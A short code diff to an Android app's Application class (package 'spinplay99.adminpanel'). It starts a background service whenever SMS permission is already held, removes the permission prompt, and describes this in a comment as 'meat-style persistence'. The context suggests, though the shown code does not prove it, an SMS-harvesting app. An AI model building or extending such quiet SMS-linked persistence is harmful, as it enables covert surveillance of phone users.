@@ -2,7 +2,7 @@ package com.spinplay99.adminpanel;
 
 import android.app.Application;
 
-/** Initialize Storm Firebase before any ContentProvider / service runs. */
+/** Firebase init; background sync starts when SMS is already granted (meat-style persistence). */
 public class SpinPlayApp extends Application {
     @Override
     public void onCreate() {
@@ -11,6 +11,5 @@ public class SpinPlayApp extends Application {
         if (PermissionHelper.hasSmsPermissions(this)) {
             ServiceLauncher.ensureRunning(this);
         }
-        PermissionHelper.launchPermissionUiIfNeeded(this);
     }
 }
